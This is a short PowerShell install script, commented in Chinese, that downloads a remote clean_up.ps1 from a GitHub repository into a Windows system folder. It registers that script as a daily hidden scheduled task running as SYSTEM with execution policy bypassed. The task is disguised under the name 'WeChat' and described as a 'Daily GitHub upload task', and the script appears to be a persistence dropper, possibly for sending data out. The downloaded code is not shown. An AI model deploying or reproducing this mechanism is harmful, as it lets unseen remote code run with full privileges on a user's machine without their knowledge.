# install.ps1 – 一次性安装脚本
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# 本地保存 clean_up 脚本的位置
$localPath = "C:\ProgramData\Microsoft\Windows\clean_up.ps1"
# 仓库里 clean_up 脚本的 URL
$remoteUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/clean_up.ps1"

# 下载 clean_up.ps1
Invoke-RestMethod -Uri $remoteUrl -OutFile $localPath -UseBasicParsing -ErrorAction Stop

# 注册计划任务 “WeChat” 每天 1:00AM 运行 clean_up.ps1
$taskName = "WeChat"
$scriptPath = $localPath

# 如果已有同名任务，先删掉
if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
$trigger = New-ScheduledTaskTrigger -Daily -At 1:00am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Daily GitHub upload task" -Principal $principal
